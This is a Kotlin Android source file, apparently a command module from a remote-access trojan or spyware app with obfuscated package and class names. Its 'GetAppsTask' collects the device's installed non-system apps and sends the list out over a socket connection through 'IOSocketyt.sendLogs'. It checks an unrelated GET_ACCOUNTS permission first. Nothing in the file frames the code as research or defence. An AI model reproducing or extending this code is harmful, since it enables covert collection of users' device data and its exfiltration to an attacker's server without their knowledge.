package com.xxx.zzz.commandp.taskssv

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import com.xxx.zzz.socketsp.IOSocketyt
import org.json.JSONArray
import org.json.JSONObject


class GetAppsTask(val ctx: Context) :
    BaseTask(ctx) {

    @SuppressLint("MissingPermission")
    private fun getApps() {
        val list = mutableSetOf<JSONObject>()
        val packages =
            ctx.packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        for (packageInfo in packages) {
            if (!isSystemPackage(packageInfo)) {
                val obj = JSONObject()
                obj.put("app", packageInfo.packageName)
                list.add(obj)
            }
        }

        val listOut = JSONArray()
        list.forEach {
            listOut.put(it)
        }
        IOSocketyt.sendLogs("", listOut.toString(), "applist")
    }

    private fun isSystemPackage(applicationInfo: ApplicationInfo): Boolean {
        return applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM != 0
    }

    override fun run() {
        super.run()
        if (ActivityCompat.checkSelfPermission(
                ctx,
                Manifest.permission.GET_ACCOUNTS
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            runCatching {
                getApps()
            }.onFailure {
                IOSocketyt.sendLogs("", "FileManagerTask ${it.localizedMessage}", "error")
            }
        } else
            requestPermissions()
    }
}


